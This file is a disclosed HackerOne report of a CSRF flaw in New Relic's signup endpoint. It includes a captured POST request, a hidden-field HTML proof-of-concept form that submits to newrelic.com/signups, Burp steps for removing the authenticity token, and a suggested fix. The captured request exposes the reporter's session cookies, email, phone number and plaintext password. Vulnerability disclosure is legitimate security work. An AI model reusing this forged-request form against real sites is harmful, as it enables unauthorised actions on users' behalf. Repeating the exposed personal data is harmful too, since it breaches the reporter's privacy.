@@ -1,0 +1,84 @@
+ReportLink:https://hackerone.com/reports/114799
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/waqar_vicky
+ReportedTo:New Relic(newrelic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:20.03.2017 1:38:21
+
+Summary:
+
+Description:
+
+POST /signups HTTP/1.1
+Host: newrelic.com
+User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-NewRelic-ID: VQQHU1RbARABVlNWAgAGUA==
+X-CSRF-Token: 
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://newrelic.com/signup
+Content-Length: 775
+Cookie: _storefront_session=41c6644a48a5ad0a3048a013adc595ba; optimizelyEndUserId=oeu1454640113929r0.2632877631374001; optimizelySegments=%7B%22171941824%22%3A%22ff%22%2C%22172184284%22%3A%22false%22%2C%22172242367%22%3A%22referral%22%7D; optimizelyBuckets=%7B%7D; utag_main=_st:1454643526226$ses_id:1454640895992%3Bexp-session; __ar_v4=DLQZ5QQWIFBZZM5ECJME6X%3A20160206%3A8%7C7QCUSMLEMBHIPPEMTU6A7A%3A20160206%3A4%7CI7ZJI4CQMBCNHGOQ27AYQZ%3A20160206%3A12%7CYCNZVXZ6TJDJ3KMJRVGKFH%3A20160206%3A12; podid=9a2b5409c38d2adf8b673eb4ad3c08ef; __distillery=v20150227_80601b47-dd9a-457d-bedb-7e47d6b01496; _mkto_trk=id:412-MZS-894&token:_mch-newrelic.com-1454640131108-32811; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22ede39706-ab87-4fda-b43e-35719c1601fa%22; wcsid=14kp8pVWiuIIblst4d2T577PCK2bOXVW; hblid=B4rViGcthk6Cuy7w4d2T577PCK2eXV40; _oklv=1454641795335%2C14kp8pVWiuIIblst4d2T577PCK2bOXVW; amplitude_idnewrelic.com=eyJkZXZpY2VJZCI6Ijc1ZGJmMTA1LWU1ZDEtNDRjZS1hYjU0LTU4OWI4MTU3MGFiYSIsInVzZXJJZCI6bnVsbCwib3B0T3V0IjpmYWxzZSwic2Vzc2lvbklkIjoxNDU0NjQwMTMzMTE2LCJsYXN0RXZlbnRUaW1lIjoxNDU0NjQxNzQzMTMwLCJldmVudElkIjoxMCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjEwfQ==; _ga=GA1.2.603378193.1454640133; _bizo_bzid=c933f7da-84a7-410d-8f85-eda47ede1943; _bizo_cksm=60EC0C97EE6E106A; _okdetect=%7B%22token%22%3A%2214546401357280%22%2C%22proto%22%3A%22https%3A%22%2C%22host%22%3A%22newrelic.com%22%7D; _bizo_np_stats=14%3D6468%2C; olfsk=olfsk6307428792791256; _ok=6544-679-10-2394; _biz_uid=269a214df3fc49d5850435a032470005; _biz_sid=67a97e; _biz_nA=14; _biz_pendingA=%5B%22m%2Fblr%3Fe%3Dp871wnKtTXUL6zFG5uSedors1ZpOjQWQpTVChC98DdsQNpbtnrRkKluJBfO1%252Fu0VOhppn5XDoJHlyZNAVJm2jAdrThYTOEi7zoUD6JsaO67d9kE3MEd%252FPBslSsRif35ddDYnVSox8BzlIhuDgphqwLSRyEBwsJJHN9FtOJEjZmA%253D%26frm_c%3D286662619%26eventSource%3DonClick-Button%26rnd%3D7fade722f0ea402b86f4fbc1729c04d4%26_biz_u%3D269a214df3fc49d5850435a032470005%26_biz_s%3D67a97e%26_biz_l%3Dhttps%253A%252F%252Fnewrelic.com%252Fsignup%26_biz_t%3D1454641803396%26_biz_i%3DSign%2520up%2520for%2520New%2520Relic%2520%257C%2520Application%2520Performance%2520Management%2520%257C%2520Application%2520Performance%2520Management%2520%2526%2520Devops%2520Tools%26_biz_n%3D13%22%5D; ei_client_id=56b412492d3bb7110005ff43; _biz_flagsA=%7B%22Version%22%3A1%2C%22Frm%22%3A%221%22%7D; hit_signup_confirmation=1; _gat=1; _okbk=cd5%3Davailable%2Ccd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1454641736513%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _gali=make-me-an-account
+Connection: keep-alive
+
+utf8=%E2%9C%93&authenticity_token=&full_name=vicky+vkt&phone_number=3216523654&email=vickyvk019%40gmail.com&password=vicky645&country=PAK&postal_code=&job_title=Exec%2FManagement+(Other)&name=vickyvk&company_size=2-10&host_estimate=1-2&platform=Android&promo_code=&terms_of_service_accepted=true&app-languages=android_&monitoring=&demandbase=&form_page=https%3A%2F%2Flogin.newrelic.com%2Flogin%3Freturn_to%3Dhttps%253A%252F%252Frpm.newrelic.com%252Fauth%252Fnewrelic%253Forigin%253Dhttps%25253A%25252F%25252Frpm.newrelic.com%25252Fusers%25252F1523198%25252Fedit&ga_client_id=&initial_mpc=&latest_mpc=&initial_http_referrer=&latest_http_referrer=&marketo_cookie=id%3A412-MZS-894%26token%3A_mch-newrelic.com-1454640131108-32811
+
+
+<html>
+  <body>
+    <form action="https://newrelic.com/signups" method="POST">
+      <input type="hidden" name="utf8" value="â&#156;&#147;" />
+      <input type="hidden" name="authenticity&#95;token" value="" />
+      <input type="hidden" name="full&#95;name" value="vicky&#32;vkt" />
+      <input type="hidden" name="phone&#95;number" value="3216523654" />
+      <input type="hidden" name="email" value="vickyvk019&#64;gmail&#46;com" />
+      <input type="hidden" name="password" value="vicky645" />
+      <input type="hidden" name="country" value="PAK" />
+      <input type="hidden" name="postal&#95;code" value="" />
+      <input type="hidden" name="job&#95;title" value="Exec&#47;Management&#32;&#40;Other&#41;" />
+      <input type="hidden" name="name" value="vickyvk" />
+      <input type="hidden" name="company&#95;size" value="2&#45;10" />
+      <input type="hidden" name="host&#95;estimate" value="1&#45;2" />
+      <input type="hidden" name="platform" value="Android" />
+      <input type="hidden" name="promo&#95;code" value="" />
+      <input type="hidden" name="terms&#95;of&#95;service&#95;accepted" value="true" />
+      <input type="hidden" name="app&#45;languages" value="android&#95;" />
+      <input type="hidden" name="monitoring" value="" />
+      <input type="hidden" name="demandbase" value="" />
+      <input type="hidden" name="form&#95;page" value="https&#58;&#47;&#47;login&#46;newrelic&#46;com&#47;login&#63;return&#95;to&#61;https&#37;3A&#37;2F&#37;2Frpm&#46;newrelic&#46;com&#37;2Fauth&#37;2Fnewrelic&#37;3Forigin&#37;3Dhttps&#37;253A&#37;252F&#37;252Frpm&#46;newrelic&#46;com&#37;252Fusers&#37;252F1523198&#37;252Fedit" />
+      <input type="hidden" name="ga&#95;client&#95;id" value="" />
+      <input type="hidden" name="initial&#95;mpc" value="" />
+      <input type="hidden" name="latest&#95;mpc" value="" />
+      <input type="hidden" name="initial&#95;http&#95;referrer" value="" />
+      <input type="hidden" name="latest&#95;http&#95;referrer" value="" />
+      <input type="hidden" name="marketo&#95;cookie" value="id&#58;412&#45;MZS&#45;894&amp;token&#58;&#95;mch&#45;newrelic&#46;com&#45;1454640131108&#45;32811" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+Steps to repo:
+
+1) Access https://newrelic.com/signup
+2) Fill Credentials
+3) Start burp
+4) Click "SUBMIT".
+5) A POST request will appear in burp. check HTTP REQUEST above.
+6) Remove the "authenticity_token=" value from request
+7) Forward the request
+8) A user can sign up easily Without validation of "authenticity_token".
+
+Verify this by checking the inbox of provided email address.
+
+FIX:
+
+Validate the value of "authenticity_token" and do not let the request go forward without it.
+
+Regards:
+Vicky
